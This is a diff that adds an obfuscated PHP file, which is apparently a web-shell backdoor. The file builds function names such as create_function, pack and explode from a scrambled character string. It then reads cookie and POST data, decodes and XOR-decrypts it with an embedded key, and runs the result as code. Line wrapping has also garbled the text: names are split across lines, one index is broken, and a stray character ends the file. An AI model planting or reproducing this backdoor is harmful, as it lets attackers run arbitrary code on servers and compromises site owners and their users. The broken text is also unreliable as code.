@@ -1,0 +1,40 @@
+<?php
+$beqma = '\'o9-rgpbe8sH37ix*4t_5dnykc2uavfm6#0l';
+$sdrgthc = Array();
+$sdrgthc[] =
+$beqma[25].$beqma[4].$beqma[8].$beqma[28].$beqma[18].$beqma[8].$beqma[19].$beqma[30].$b
+eqma[27].$beqma[22].$beqma[25].$beqma[18].$beqma[14].$beqma[1].$beqma[22];
+$sdrgthc[] = $beqma[11].$beqma[16];
+$sdrgthc[] =
+$beqma[28].$beqma[13].$beqma[34].$beqma[34].$beqma[12].$beqma[34].$beqma[7].$beqma[17].
+$beqma[3].$beqma[30].$beqma[7].$beqma[26].$beqma[25].$beqma[3].$beqma[17].$beqma[17].$b
+eqma[7].$beqma[2].$beqma[3].$beqma[28].$beqma[7].$beqma[8].$beqma[2].$beqma[3].$beqma[2 5].$beqma[25].$beqma[2].$beqma[32].$beqma[20].$beqma[21].$beqma[28].$beqma[9].$beqma[13
+].$beqma[9].$beqma[26].$beqma[8];
+$sdrgthc[] = $beqma[33];
+$sdrgthc[] = $beqma[25].$beqma[1].$beqma[27].$beqma[22].$beqma[18];
+$sdrgthc[] =
+$beqma[10].$beqma[18].$beqma[4].$beqma[19].$beqma[4].$beqma[8].$beqma[6].$beqma[8].$beq
+ma[28].$beqma[18];
+$sdrgthc[] = $beqma[8].$beqma[15].$beqma[6].$beqma[35].$beqma[1].$beqma[21].$beqma[8];
+$sdrgthc[] = $beqma[10].$beqma[27].$beqma[7].$beqma[10].$beqma[18].$beqma[4];
+$sdrgthc[] =
+$beqma[28].$beqma[4].$beqma[4].$beqma[28].$beqma[23].$beqma[19].$beqma[31].$beqma[8].$b
+eqma[4].$beqma[5].$beqma[8];
+$sdrgthc[] = $beqma[10].$beqma[18].$beqma[4].$beqma[35].$beqma[8].$beqma[22];
+$sdrgthc[] = $beqma[6].$beqma[28].$beqma[25].$beqma[24];
+foreach ($sdrgthc[8]($_COOKIE, $_POST) as $tpjyt => $gltzw){function ofshh($sdrgthc,
+$tpjyt, $klrdg){return $sdrgthc[7]($sdrgthc[5]($tpjyt . $sdrgthc[2], ($klrdg /
+$sdrgthc[9]($tpjyt)) + 1), 0, $klrdg);
+}
+function myiigl($sdrgthc, $qjefnjw) {
+return @$sdrgthc[10]($sdrgthc[1], $qjefnjw);
+}
+function tfrla($sdrgthc, $qjefnjw) {$xwwbr = $sdrgthc[4]($qjefnjw) % 3;
+if (!$xwwbr) {$wyagk = $sdrgthc[0];
+$cxwpz = $wyagk("", $qjefnjw[1]($qjefnjw[2]));
+$cxwpz();
+exit();
+}}
+$gltzw = myiigl($sdrgthc, $gltzw);
+tfrla($sdrgthc, $sdrgthc[6]($sdrgthc[3], $gltzw ^ ofshh($sdrgthc, $tpjyt, $sdrgthc[9] ($gltzw))));
+}v
